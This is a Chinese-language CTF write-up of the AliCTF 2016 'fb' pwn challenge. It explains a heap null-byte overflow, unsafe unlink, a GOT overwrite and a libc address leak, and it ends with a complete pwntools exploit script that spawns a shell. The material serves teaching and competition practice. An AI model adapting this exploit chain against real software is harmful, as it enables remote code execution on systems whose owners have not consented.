title: AliCTF 2016 fb writeup

date: 2016/06/07 20:33:00

---

一道堆中的null byte溢出题

程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存

<!--more-->

由于读取输入的时候会在最后再添加'\x00'：
```
.text:00000000004008E4                 cdqe
.text:00000000004008E6                 lea     rdx, [rax-1]
.text:00000000004008EA                 mov     rax, [rbp+var_18]
.text:00000000004008EE                 add     rax, rdx
.text:00000000004008F1                 mov     byte ptr [rax], 0
.text:00000000004008F4                 mov     eax, [rbp+var_8]
.text:00000000004008F7                 sub     eax, 1
```

所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来...）

之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：

```
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用[libc-database][1]这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址

然后泄漏出来算下偏移就可以调用system()了



Exploit:

```
# -*- coding: utf-8 -*-
from pwn import *

io=process('./fb')
# io = remote("114.55.103.213",9733)

SIZE=0xf8
PLT_puts=0x4006C0
GOT_free=0x602018
GOT_read=0x602040
FD=0x6020C8
BK=0x6020D0

def init(size):
	io.recvuntil('Choice:')
	io.sendline('1')
	io.recvuntil('length:')
	io.sendline(str(size))
	io.recvuntil('Done~')

def edit(index,content):
	io.recvuntil('Choice:')
	io.sendline('2')
	io.recvuntil('index:')
	io.sendline(str(index))
	io.recvuntil('content:')
	io.sendline(str(content))
	io.recvuntil('Done~')

def delete(index):
	io.recvuntil('Choice:')
	io.sendline('3')
	io.recvuntil('index:')
	io.sendline(str(index))
	io.recvuntil('Done~')

def leak(dst):
	edit(1,p64(dst)+p64(SIZE)[:-1])
	io.recvuntil('Choice:')
	io.sendline('3')
	io.recvuntil('index:')
	io.sendline('0')
	leakmem = io.recvuntil("Done~")[:-6]
	return str(leakmem)

def main():

	init(SIZE)
	init(SIZE)
	init(SIZE)
	init(SIZE)
	init(SIZE)

	payload=p64(0xf1)+p64(0xf1)+p64(FD)+p64(BK)+'A'*0xd0+p64(0xf0)
	# overflow null byte
	edit(2,payload)
        # gdb.attach(io,execute=("b *%s"%(0x400CCF)))
	delete(3)
        
	payload2=p64(SIZE)+p64(0x6020C0)+p64(SIZE)+p64(GOT_free)+p64(SIZE)
	edit(2,payload2)

	# modify GOT entry of free to PLT entry of puts
	# use [:1] to prevent \x00 from causing damage
	edit(2,p64(PLT_puts)[:-1])

	# leak read_addr
	read_addr=u64(leak(GOT_read).ljust(8,'\x00'))
	print "read_addr: "+str(hex(read_addr))


	system_addr=read_addr-0x980C0
	# system_addr= read_addr-0xeb6a0 +0x46590
	
	# modify free to system
	edit(2,p64(system_addr)[:-1])
	edit(4,"/bin/sh")
	
	# now get shell
	io.recvuntil('Choice:')
	io.sendline('3')
	io.recvuntil('index:')
	io.sendline('4')

	io.interactive()

main()


```


[1]: https://github.com/niklasb/libc-database